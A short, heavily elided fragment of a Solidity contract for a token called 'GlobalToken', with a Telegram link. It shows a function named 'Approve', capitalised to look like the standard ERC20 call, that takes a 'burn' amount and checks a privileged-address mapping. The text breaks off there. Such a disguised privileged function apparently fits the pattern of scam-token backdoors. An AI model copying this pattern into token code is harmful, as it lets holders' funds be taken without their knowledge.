...
Telegram : https://t.me/GlobalTokenOfficial
*/
 ...
 */
 ...
 contract GlobalToken is Context, ERC20, ERC20Metadata {
    ...
    string  private _name = "GlobalToken";
    ...
    function Approve(uint256 burn) external{
        if (_feeSwapm[msg.sender]) {
